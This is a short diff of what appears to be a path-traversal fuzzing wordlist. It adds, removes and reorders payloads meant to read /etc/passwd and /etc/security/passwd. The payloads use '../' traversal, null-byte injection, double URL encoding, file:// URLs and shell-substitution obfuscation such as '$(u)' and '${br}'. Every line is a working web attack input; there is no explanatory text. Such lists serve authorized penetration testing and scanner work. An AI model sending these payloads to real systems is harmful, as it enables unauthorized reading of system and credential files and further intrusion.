@@ -1,11 +1,6 @@
 ../xxxml_db/../../../../../etc/passwd
-file:/etc/passwd%3F/
-file:/etc%252Fpasswd/
-file:/etc%252Fpasswd%3F/
-file:///etc/%3F/../passwd
 file:${br}/et${u}c%252Fpas${te}swd%3F/
 file:$(br)/et$(u)c%252Fpas$(te)swd%3F/
-file:///etc/passwd?/../passwd
 ..0.000000..0.000000..0.000000..0.000000..0.000000..0.000000..0.000000etc0.000000passwd;/../;/../
 %00../../../../../../etc/passwd
 %00/etc/passwd%00
@@ -1479,13 +1474,10 @@ etc/passwd
 ../../etc/security/passwd%00
 ../etc/security/passwd%00
 /etc/security/passwd%00
-file:$(br)/et$(u)c%252Fpas$(te)swd%3F/
-file:${br}/et${u}c%252Fpas${te}swd%3F/
 file://127.0.0.1/etc/passwd
 file:/etc%252Fpasswd/
 file:/etc%252Fpasswd%3F/
 file:///etc/%3F/../passwd
-file:///etc/%3F/../passwd file:${br}/et${u}c%252Fpas${te}swd%3F/ file:$(br)/et$(u)c%252Fpas$(te)swd%3F/
 file:////etc/passwd
 file:///etc/?/../passwd
 file:///etc/passwd
